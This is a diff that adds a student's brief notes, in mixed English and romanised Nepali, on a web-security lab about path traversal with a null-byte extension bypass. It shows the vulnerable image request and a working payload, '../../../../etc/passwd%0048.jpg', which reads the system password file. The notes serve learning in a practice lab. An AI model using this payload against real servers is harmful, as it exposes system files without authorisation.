@@ -1,0 +1,17 @@
+Lab: File path traversal, validation of file extension with null byte bypass
+
+Target: To solve the lab, retrieve the contents of the /etc/passwd file. 
+
+This lab expected that supplies filename ends with the expected file extension.
+
+yasma null byte ko concept xa jasle vanna khojako chai
+%00 lai nullbyte vancha tespaxi aune sabai kura ignore gardincha this is like a comment in programming jasle kai kura ignore garcha yo chai kun framework ma website banako xa tyo anushar tha huncha
+right now use %00 as nullbyte.
+
+Analysis: 
+1.The url get request is:GET /image?filename=48.jpg HTTP/1.1
+this expected that it also ends with .jpg extension.
+so i will do:
+../../../../etc/passwd%0048.jpg
+
+ok this works yaya congrulations to me.
